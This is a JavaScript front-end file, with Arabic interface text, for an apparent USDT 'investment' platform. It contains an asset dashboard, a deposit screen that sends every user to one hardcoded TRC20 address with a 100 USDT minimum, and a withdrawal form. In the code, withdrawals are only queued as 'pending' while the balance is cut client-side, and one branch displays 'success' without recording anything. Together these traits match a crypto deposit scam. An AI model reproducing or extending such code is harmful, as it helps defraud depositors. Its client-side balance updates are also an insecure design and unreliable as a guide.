astHTML='<div class="astin" dir="ltr"><div class="acard"><div><div class="albl">إجمالي الأصول (USDT)<svg id="ey" onclick="tgE()" viewBox="0 0 24 24"><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7z"/><circle cx="12" cy="12" r="3"/></svg></div><div class="aval" id="av">0.00</div></div><div class="aday"><div class="albl2">أرباح اليوم</div><div class="aval2" id="ady">0</div></div></div><div class="abtns"><button class="abtn dep" onclick="openDep()"><img src="https://i.ibb.co/FbbVgh74/IMG.png" alt="">الإيداع</button><button class="abtn wd" onclick="openWd()"><img src="https://i.ibb.co/DDgGy91y/IMG.png" alt="">سحب العملات</button></div><div class="atabs"><div class="atab on">الأصول</div><div class="atab">إجمالي الأصول</div><div class="arec"><svg viewBox="0 0 24 24"><rect x="5" y="3.5" width="14" height="17" rx="2"/><path d="M9 8.5h6M9 12h6M9 15.5h4"/></svg>السجل</div></div><div class="arow"><span>حساب الأموال</span><b id="fundV">0 USDT</b></div><div class="arow"><span>أرباح الفريق</span><b>0.00 USDT</b></div></div>';
var depHTML='<div class="dpin"><div class="wdt"><div class="pfb" onclick="closeDep()"><img src="https://i.ibb.co/k69JQ9LS/IMG.png" alt="back"></div><h1>الإيداع في العملة</h1><div class="wdb" onclick="openRec(\'dep\')"><svg viewBox="0 0 24 24"><path d="M6 3h9l4 4v14H6z"/><path d="M9 11.5h6M9 15.5h6M9 7.5h2.5"/></svg></div></div><div class="dsub">اختيار العملة</div><div class="dnet"><span>USDT-TRC20</span><svg viewBox="0 0 24 24"><path d="M6 9l6 6 6-6"/></svg></div><div class="dqrw"><div class="dqr"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAATYAAAE2AQAAAADDx4MEAAACHklEQVR4nO2aQYrkMAxFv8beOzfoo6Ru0GeamzkHKkiWAzF/FpJdLpqBhmacVEpZFKn4QWyE8qVvC/Gdq/z6FgY49zMOzO2OayBJ0gbSXofSfvZ1XIhLJMkdAIpgmQANyrzaHfNLrOMyXBGRCcAyAbCgtGcicvT83pqb10AAQfNj3HudAwDEL0+2CRqKZbr/v/c6928ukFwBIJFyA4BlKqJCP5u8v8I6rsBFYJP2r0QuH3vk8mkPbCidfh1X4ayC0jIqkaofM6k/9fJ6dxDXtRk1KDtqPB4DHo9BnHaBAAKZUVMDj1YQgczeD47itD9/6Dlzev58cQdmz49RnIbCkkQ/VXv9hiVqznh+jON6/8oSor+am3L2dVyF63JBQ5EB2F0Tes+PYZy5uhmWH52SsCm768cwzvQjJ5prZQUV+5rL/fZhnEm5eutrqP3H2uRkBTwe4zhYBaWpAXRFb4api+v5OC4C6S4AinD5vKvdK81qF6TgfuIRXKDctghmFA0PmvErtxPM7424QMxrkcdWFH9LBHTjUER8v3Yc98XfBUxTuv7c9WMY93S+hF1BpT/VzvJ4jOPa+ZJFRLBMgd0mOrZ49Pzeimt+yY6HoVtr4Hp5fz6Me4pH35DX43Gr9+fHcUXqrmCg3NIfEfnQdv0c87s+F2GuVQHm2qITKHVgi/uR83tDbhMRkainfKqABwKbSDv58wLruAQnfr79VNxfhObGJu8HsgcAAAAASUVORK5CYII=" alt="QR"></div></div><div class="dcpr"><span class="t">عنوان الإيداع في العملة</span><span class="dcp" onclick="cpT(\'TZ76Nx4tri1Seth6TuVGknLQDU49dKYxg\')"><svg viewBox="0 0 24 24"><rect x="9" y="9" width="11" height="11" rx="2"/><path d="M5 15H4a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h10a1 1 0 0 1 1 1v1"/></svg>نسخ</span></div><div class="daddr">TZ76Nx4tri1Seth6TuVGknLQDU49dKYxg</div><div class="wnote"><b>ملاحظة أمنية</b><p>The minimum deposit amount is 100 USDT. Please ensure that the currency and grid information are correct to avoid financial loss. If the deposit currency is incorrect or the deposit amount is less than 100 USDT, the lost funds will be irrecoverable.</p></div></div>';
var d=document.getElementById('dep');if(d){d.className='dpw';d.innerHTML=depHTML}
var wdHTML='<div class="wdin"><div class="wdt"><div class="pfb" onclick="closeWd()"><img src="https://i.ibb.co/k69JQ9LS/IMG.png" alt="back"></div><h1 data-t="wdTitle">سحب العملات</h1><div class="wdb" onclick="wdOpenRecs()"><svg viewBox="0 0 24 24"><path d="M6 3h9l4 4v14H6z"/><path d="M9 11.5h6M9 15.5h6M9 7.5h2.5"/></svg></div></div><div class="wnet"><span>TRC20</span><svg viewBox="0 0 24 24"><path d="M6 9l6 6 6-6"/></svg></div><div class="wblk"><div class="wlb" data-t="sendAddr">عنوان الإرسال</div><div class="wbox"><input dir="ltr" id="wAddr" data-ph="phAddr" placeholder="أدخل عنوان الإرسال"><svg viewBox="0 0 24 24"><path d="M4 8V5a1 1 0 0 1 1-1h3M16 4h3a1 1 0 0 1 1 1v3M20 16v3a1 1 0 0 1-1 1h-3M8 20H5a1 1 0 0 1-1-1v-3M4 12h16"/></svg></div><div class="wrow"><span data-h="qty">الكمية<br>المستخرجة</span><div class="wbal"><span data-t="avail">الرصيد المتوفر للسحب (USDT) :$</span><b id="wBalV">0.00</b></div></div><div class="wbox"><input inputmode="decimal" id="wAmt" data-ph="phQty" placeholder="أدخل الكمية"><span class="wfull" data-t="wdAll" onclick="wdFillMax()">السحب الكامل</span></div><div class="wlb" data-t="payPwd">كلمة مرور التعامل</div><div class="wbox"><input type="password" id="wPass" data-ph="phPwd" placeholder="يرجى إدخال كلمة مرور التعامل"></div><button class="wgo" data-t="confirmWd" onclick="wdConfirm()">تأكيد السحب</button><div class="wnote"><b data-t="secNote">ملاحظة أمنية</b><p data-t="secTxt">Please check and make sure the address and grid are correct to avoid loss of funds. If you transfer to the wrong address, the lost funds will not be recovered.</p></div></div></div>';
var w=document.getElementById('wdw');if(w){w.innerHTML=wdHTML}

/* === تم حذف تعريف wdHTML وحقن CSS الخاص بالتصميم الجديد للسحب === */
/* السبب: التصميم القديم الأصلي (الذي يحتوي العنوان TLhzZAb1pqhUxxAUFag68XgXRCJ1X) موجود مسبقاً داخل #wd في الصفحة، وكان يتم استبداله عند تحميل هذا الملف وعند فتح صفحة السحب. أصبح الآن يُستخدم كما هو بدون أي حقن أو استبدال. */

var AST_FB_CFG={apiKey:"AIzaSyBvzfJOOjRFZnTgTUrwEZQPr8Ba7zKKlNg",authDomain:"hhhxh-5ebe4.firebaseapp.com",projectId:"hhhxh-5ebe4",storageBucket:"hhhxh-5ebe4.firebasestorage.app",messagingSenderId:"79243000696",appId:"1:79243000696:web:ee0fb2d2ccce791954e68d",measurementId:"G-08BR6LN6PT"};
var astFB={ready:false,uid:null,db:null,auth:null,fs:null};
var astBal=(typeof astBal!=='undefined')?astBal:0;
var astEyeOpen=(typeof astEyeOpen!=='undefined')?astEyeOpen:true;
try{var _astEyeSaved=localStorage.getItem('astEye');if(_astEyeSaved==='0')astEyeOpen=false;}catch(e){}
var AST_EYE_OPEN='<path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7z"/><circle cx="12" cy="12" r="3"/>';
var AST_EYE_OFF='<path d="M3 3l18 18"/><path d="M10.6 5.1A9.7 9.7 0 0 1 12 5c5 0 9 4.6 10 7-.35.9-1.2 2.3-2.6 3.6M6.6 6.6C4.2 8 2.6 10.4 2 12c1 2.4 5 7 10 7 1.4 0 2.8-.35 4-.95M9.9 9.9a3 3 0 0 0 4.2 4.2"/>';

if(!window.__astInit){
window.__astInit=true;
(async function(){
  try{
    var authM=await import('https://www.gstatic.com/firebasejs/12.19.0/firebase-auth.js');
    var fsM=await import('https://www.gstatic.com/firebasejs/12.19.0/firebase-firestore.js');
    astFB.fs=fsM;
    var app=(window.__exFB&&window.__exFB.app)?window.__exFB.app:null;
    if(app){
      astFB.auth=window.__exFB.auth||authM.getAuth(app);
      astFB.db=window.__exFB.db||fsM.getFirestore(app);
    }else{
      var appM=await import('https://www.gstatic.com/firebasejs/12.19.0/firebase-app.js');
      var app2;
      try{app2=appM.getApp('trdApp');}catch(e){app2=appM.initializeApp(AST_FB_CFG,'astApp');}
      astFB.auth=authM.getAuth(app2);
      astFB.db=fsM.getFirestore(app2);
    }
    authM.onAuthStateChanged(astFB.auth,async function(u){
      try{
        if(!u){astFB.ready=false;astFB.uid=null;return;}
        astFB.uid=u.uid;
        astFB.ready=true;
        await astLoadUser();
      }catch(e){}
    });
  }catch(e){}
})();
}

async function astLoadUser(){
  try{
    var fs=astFB.fs;
    var snap=await fs.getDoc(fs.doc(astFB.db,'users',astFB.uid));
    if(snap.exists()){
      var d=snap.data()||{};
      var nb=Number(d.balance);
      if(isFinite(nb))astBal=nb;
      astRenderBal();
      var now=Date.now(),day=24*60*60*1000,profit=0;
      (d.records||[]).forEach(function(r){if(r&&r.type==='buy'&&(now-r.at)<day)profit+=Number(r.amount)||0;});
      var ady=document.getElementById('ady');
      if(ady)ady.textContent=profit.toFixed(2);
    }
  }catch(e){}
}

function astRenderBal(){
  var nb=Number(astBal);
  if(!isFinite(nb))nb=0;
  var av=document.getElementById('av');
  if(av){
    var cur=av.textContent.trim();
    if(astEyeOpen){
      av.textContent=nb>0?nb.toFixed(2):(av.dataset.astLast||cur||'0.00');
    }else{
      if(cur&&cur!=='*** ***'&&cur!=='0.00')av.dataset.astLast=cur;
      av.textContent='*** ***';
    }
  }
  var fv=document.getElementById('fundV');
  if(fv){
    var fcur=fv.textContent.replace('USDT','').trim();
    if(astEyeOpen){
      fv.textContent=(nb>0?nb.toFixed(2):(fv.dataset.astLast||fcur||'0.00'))+' USDT';
    }else{
      if(fcur&&fcur!=='*** ***'&&fcur!=='0.00')fv.dataset.astLast=fcur;
      fv.textContent='*** *** USDT';
    }
  }
  var wb=document.getElementById('wBalV');
  if(wb){wb.textContent=nb.toFixed(2);}
  var ey=document.getElementById('ey');
  if(ey){var ic=astEyeOpen?AST_EYE_OPEN:AST_EYE_OFF;if(ey.innerHTML!==ic)ey.innerHTML=ic;}
}

async function astRefresh(){
  astRenderBal();
  if(astFB.ready&&astFB.uid){
    try{await astLoadUser();}catch(e){astRenderBal();}
  }
}

if(!window.__astObserver&&typeof MutationObserver!=='undefined'&&document.body){
  window.__astObserver=new MutationObserver(function(){
    var av=document.getElementById('av');
    if(av&&!av.dataset.astBound){
      av.dataset.astBound='1';
      astRefresh();
    }
  });
  window.__astObserver.observe(document.body,{childList:true,subtree:true});
}
astRefresh();

window.tgE=function(){
  astEyeOpen=!astEyeOpen;
  try{localStorage.setItem('astEye',astEyeOpen?'1':'0');}catch(e){}
  astRenderBal();
};

/* ===== قسم السحب: استخدام التصميم القديم الأصلي الموجود في الصفحة (#wd / #withdraw) بدون أي حقن أو استبدال أو CSS إضافي ===== */

window.wdFillMax=function(){
  var el=document.getElementById('wdamt')||document.getElementById('withdrawAmount')||document.getElementById('wAmt');
  if(!el)return;
  var nb=Number(astBal);if(!isFinite(nb)||nb<0)nb=0;
  el.value=nb.toFixed(2);
};

window.openWd=function(){
  var w=document.getElementById('wdw');
  if(!w)return;
  if(!w.innerHTML&&typeof wdHTML!=='undefined'){w.innerHTML=wdHTML;}
  try{if(typeof hideAll==='function')hideAll();}catch(e){}
  try{var nv=document.querySelector('.nav');if(nv)nv.style.display='none';}catch(e){}
  w.style.display='block';
  try{window.scrollTo(0,0);}catch(e){}
  try{if(typeof flashLd==='function')flashLd();}catch(e){}
};

window.closeWd=function(){
  try{if(typeof hideAll==='function')hideAll();}catch(e){}
  try{var nv=document.querySelector('.nav');if(nv)nv.style.display='flex';}catch(e){}
  var a=document.getElementById('ast');if(a)a.style.display='block';
  try{if(typeof setNav==='function')setNav(4);}catch(e){}
  try{window.scrollTo(0,0);}catch(e){}
  try{if(typeof flashLd==='function')flashLd();}catch(e){}
};

window.wdConfirm=async function(){
  var addrEl=document.getElementById('wAddr')||document.getElementById('wdaddr')||document.getElementById('withdrawAddr');
  var waddr=(addrEl&&addrEl.value)?addrEl.value.trim():'';
  var amtEl=document.getElementById('wAmt')||document.getElementById('wdamt')||document.getElementById('withdrawAmount');
  var passEl=document.getElementById('wPass')||document.getElementById('wdpass')||document.getElementById('withdrawPass');
  var amt=parseFloat(amtEl?amtEl.value:'');
  var pass=passEl?passEl.value:'';
  if(!waddr){alert('يرجى إدخال عنوان الإرسال');return;}
  if(!isFinite(amt)||amt<=0){alert('يرجى إدخال كمية صحيحة');return;}
  if(amt<10){alert('الحد الأدنى للسحب هو 10 USDT');return;}
  var nb=Number(astBal);if(!isFinite(nb))nb=0;
  if(amt>nb){alert('الكمية أكبر من الرصيد المتاح للسحب');return;}
  if(!pass){alert('يرجى إدخال كلمة مرور التعامل');return;}
  var newRec={type:'withdraw',amount:amt,at:Date.now(),addr:waddr,status:'pending'};
  wdShowLd('جاري إرسال طلب السحب...');
  try{
    if(astFB.ready&&astFB.uid&&astFB.fs){
      var fs=astFB.fs;
      var ref=fs.doc(astFB.db,'users',astFB.uid);
      var snap=await fs.getDoc(ref);
      var d=snap.exists()?(snap.data()||{}):{};
      var cur=Number(d.balance);if(!isFinite(cur))cur=nb;
      if(amt>cur){wdHideLd();alert('الكمية أكبر من الرصيد المتاح للسحب');return;}
      var recs=Array.isArray(d.records)?d.records.slice():[];
      recs.push(newRec);
      await fs.updateDoc(ref,{balance:cur-amt,records:recs});
      astBal=cur-amt;
      astRenderBal();
      wdHideLd();
      wdShowOk('نجاح الأمر',function(){closeWd();wdOpenRecs();});
    }else{
      wdHideLd();
      wdShowOk('نجاح الأمر',function(){closeWd();wdOpenRecs();});
    }
  }catch(e){wdHideLd();alert('حدث خطأ، يرجى المحاولة مرة أخرى');}
};

/* ===== سجل طلبات السحب: تصميم مطابق تماماً للصورة (خلفية كحلية، بطاقة نجاح، TRC20، الرسوم 5%، التاريخ YYYY-MM-DD HH:MM:SS) ===== */
function wdFmtD(t){
  var d=new Date(Number(t)||Date.now());
  function p2(n){return (n<10?'0':'')+n;}
  return d.getFullYear()+'-'+p2(d.getMonth()+1)+'-'+p2(d.getDate())+' '+p2(d.getHours())+':'+p2(d.getMinutes())+':'+p2(d.getSeconds());
}

window.wdShowRecs=function(recs){
  try{
    if(!document.getElementById('wdRecCss')){
      var st=document.createElement('style');
      st.id='wdRecCss';
      st.textContent='#wdRecOv{position:fixed;inset:0;z-index:99999;overflow-y:auto;background:linear-gradient(180deg,#0b2a6b 0%,#071a4a 30%,#020b28 100%);direction:ltr;}'
      +'.wrh{display:flex;align-items:center;padding:14px 12px;}'
      +'.wrbk{width:34px;height:34px;border-radius:8px;background:rgba(255,255,255,.14);display:flex;align-items:center;justify-content:center;cursor:pointer;}'
      +'.wrbk svg{width:20px;height:20px;fill:none;stroke:#fff;stroke-width:2.4;stroke-linecap:round;stroke-linejoin:round;}'
      +'.wrc{margin:10px 12px;padding:12px 14px;border-radius:10px;background:rgba(150,142,125,.42);box-shadow:0 2px 8px rgba(0,0,0,.22);}'
      +'.wrk{color:#fff;font-size:13px;font-weight:600;margin-bottom:8px;}'
      +'.wrk.stp{color:#ffc24b;}'
      +'.wrk.stok{color:#2ee6a8;}'
      +'.wrk.stno{color:#ff6b6b;}'
      +'.wra{color:#fff;font-size:18px;font-weight:600;letter-spacing:.3px;margin-bottom:8px;}'
      +'.wrl{display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;}'
      +'.wrn{color:#aeb6cf;font-size:12px;}'
      +'.wrd{color:#aeb6cf;font-size:12px;direction:ltr;}'
      +'.wrf{color:#aeb6cf;font-size:12px;}'
      +'.wrf span{color:#8f97b2;}'
      +'.wrad{color:#8f97b2;font-size:11px;direction:ltr;word-break:break-all;margin-top:4px;text-align:left;}'
      +'.wrempty{color:#aeb6cf;text-align:center;padding:60px 20px;font-size:14px;}';
      document.head.appendChild(st);
    }
    var ov=document.getElementById('wdRecOv');
    if(!ov){ov=document.createElement('div');ov.id='wdRecOv';document.body.appendChild(ov);}
    var h='<div class="wrh"><div class="wrbk" onclick="wdHideRecs()"><svg viewBox="0 0 24 24"><path d="M15 5l-7 7 7 7"/></svg></div></div>';
    var list=(recs||[]).filter(function(r){return r&&r.type==='withdraw';}).slice().reverse();
    if(!list.length){h+='<div class="wrempty">لا توجد طلبات سحب بعد</div>';}
    list.forEach(function(r){
      var amt=Number(r.amount)||0;
      var fee=amt*0.05;
      var rs=(r&&r.status)?String(r.status):'pending';
      var stTxt='قيد المعالجة',stCls='stp';
      if(rs==='approved'||rs==='success'){stTxt='نجاح';stCls='stok';}
      else if(rs==='rejected'||rs==='failed'){stTxt='فشل';stCls='stno';}
      h+='<div class="wrc">'
        +'<div class="wrk '+stCls+'">'+stTxt+'</div>'
        +'<div class="wra">'+amt.toFixed(8)+' USDT</div>'
        +'<div class="wrl"><span class="wrn">TRC20</span><span class="wrd">'+wdFmtD(r.at)+'</span></div>'
        +'<div class="wrf">'+fee.toFixed(8)+' <span>الرسوم</span></div>'
        +(r.addr?'<div class="wrad">'+String(r.addr).replace(/</g,'&lt;')+'</div>':'')
        +'</div>';
    });
    ov.innerHTML=h;
    ov.style.display='block';
    try{window.scrollTo(0,0);}catch(e){}
  }catch(e){}
};

window.wdHideRecs=function(){
  var ov=document.getElementById('wdRecOv');
  if(ov)ov.style.display='none';
  if(wdRecUnsub){try{wdRecUnsub();}catch(e){}wdRecUnsub=null;}
};

/* ===== شاشة التحميل (أيقونة تحميل في نص الشاشة) وشاشة نجاح الأمر (خلفية سوداء شفافة) ===== */
function wdOvCss(){
  if(document.getElementById('wdOvCss'))return;
  var st=document.createElement('style');
  st.id='wdOvCss';
  st.textContent='#wdLdOv{position:fixed;inset:0;z-index:999999;background:rgba(0,0,0,.55);display:flex;align-items:center;justify-content:center;direction:ltr;}'
  +'.wdldbox{display:flex;flex-direction:column;align-items:center;gap:12px;}'
  +'.wdspin{width:46px;height:46px;border-radius:50%;border:4px solid rgba(255,255,255,.25);border-top-color:#fff;animation:wdsp .8s linear infinite;}'
  +'@keyframes wdsp{to{transform:rotate(360deg)}}'
  +'.wdldt{color:#fff;font-size:14px;}'
  +'.wdokbox{background:rgba(0,0,0,.78);border-radius:14px;padding:26px 34px;display:flex;flex-direction:column;align-items:center;gap:12px;}'
  +'.wdokic{width:52px;height:52px;border-radius:50%;background:#22c55e;display:flex;align-items:center;justify-content:center;}'
  +'.wdokic svg{width:28px;height:28px;fill:none;stroke:#fff;stroke-width:3;stroke-linecap:round;stroke-linejoin:round;}'
  +'.wdokt{color:#fff;font-size:16px;font-weight:600;}';
  document.head.appendChild(st);
}
window.wdShowLd=function(t){
  wdOvCss();
  var ov=document.getElementById('wdLdOv');
  if(!ov){ov=document.createElement('div');ov.id='wdLdOv';document.body.appendChild(ov);}
  ov.innerHTML='<div class="wdldbox"><div class="wdspin"></div><div class="wdldt">'+(t||'جاري المعالجة...')+'</div></div>';
  ov.style.display='flex';
};
window.wdHideLd=function(){
  var ov=document.getElementById('wdLdOv');
  if(ov)ov.style.display='none';
};
window.wdShowOk=function(msg,cb){
  wdOvCss();
  var ov=document.getElementById('wdLdOv');
  if(!ov){ov=document.createElement('div');ov.id='wdLdOv';document.body.appendChild(ov);}
  ov.innerHTML='<div class="wdokbox"><div class="wdokic"><svg viewBox="0 0 24 24"><path d="M4 12.5l5 5L20 6.5"/></svg></div><div class="wdokt">'+(msg||'نجاح الأمر')+'</div></div>';
  ov.style.display='flex';
  setTimeout(function(){ov.style.display='none';if(typeof cb==='function')cb();},1600);
};

/* ===== فتح سجل طلبات السحب من صفحة السحب: نفس سجل قسم الإيداع حرفياً (openRec) ويعرض طلبات السحب ===== */
var wdRecUnsub=null;
window.wdOpenRecs=function(){
  /* أولاً: استخدام نفس دالة سجل الإيداع الموجودة في الصفحة لعرض طلبات السحب بنفس التصميم حرفياً */
  if(typeof openRec==='function'){
    try{if(wdRecUnsub){try{wdRecUnsub();}catch(e){}wdRecUnsub=null;}
      var _ov=document.getElementById('wdRecOv');if(_ov)_ov.style.display='none';
      openRec('wd');return;
    }catch(e){}
  }
  /* احتياطي فقط إذا لم تكن openRec متوفرة: السجل القديم */
  wdShowRecs([]);
  try{
    if(astFB.ready&&astFB.uid&&astFB.fs){
      var fs=astFB.fs;
      if(wdRecUnsub){try{wdRecUnsub();}catch(e){}wdRecUnsub=null;}
      wdRecUnsub=fs.onSnapshot(fs.doc(astFB.db,'users',astFB.uid),function(snap){
        try{
          var d=snap.exists()?(snap.data()||{}):{};
          var ov=document.getElementById('wdRecOv');
          if(ov&&ov.style.display!=='none')wdShowRecs(Array.isArray(d.records)?d.records:[]);
        }catch(e){}
      },function(){});
    }
  }catch(e){}
};
